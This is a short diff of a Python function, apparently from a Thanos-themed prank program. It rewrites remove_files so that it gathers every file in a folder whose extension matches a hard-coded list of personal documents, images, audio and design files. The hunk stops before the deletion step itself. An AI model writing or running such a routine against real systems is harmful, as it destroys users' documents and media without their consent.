@@ -39,16 +39,20 @@ def remove_files(path,ext=None):
     #label6 = thanos.AnimatedGIF(window, "thanos1.gif")
     #label6.pack()
     #label5.destroy()
-    remove_filelist=[]
-    print("os.removelistdir(): \n", os.listdir())
+    remove_filelist = []
+    extlist = \
+        ['doc', 'docx', 'txt', 'hwp', 'ppt', 'pptx', 'xlsx', 'xls', 'pdf',
+         'jpg', 'jpeg', 'png', 'gif',
+         'mp3', 'wav', 'wma',
+         'psd', 'pdd', 'ai', 'dwg', 'dxf', '3dm']
+    print("os.listdir(): \n", os.listdir())
     for name in os.listdir(path):
         if os.path.isfile(os.path.join(path, name)):
-            if name.endswith('.py'):
-                continue
-            if (ext == None):
-                remove_filelist.append(name)
-            elif name.endswith(ext):
-                remove_filelist.append(name)
+            for i in extlist:
+                if name.endswith(i):
+                    remove_filelist.append(name)
+                else:
+                    continue
     print("remove_filelist: \n", remove_filelist)
 
     if(len(remove_filelist)>2):
